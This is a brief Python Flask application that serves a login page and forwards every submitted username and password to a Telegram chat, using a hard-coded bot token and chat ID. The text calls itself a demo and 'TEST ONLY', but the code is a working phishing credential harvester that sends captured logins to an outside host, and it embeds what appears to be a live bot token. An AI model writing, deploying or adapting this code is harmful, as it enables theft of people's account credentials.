from flask import Flask, render_template, request
import requests

BOT_TOKEN = "8250558244:AAHZ6KhYcWbb3WslslYueZJvvFGJqFYC_9I"
CHAT_ID = "6765209842"

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    user = request.form.get("username")
    pwd = request.form.get("password")

    msg = f"🧪 DEMO LOGIN\nUser: {user}\nPass: {pwd}\n(TEST ONLY)"

    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        data={"chat_id": CHAT_ID, "text": msg}
    )
    return "Demo received ✅"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
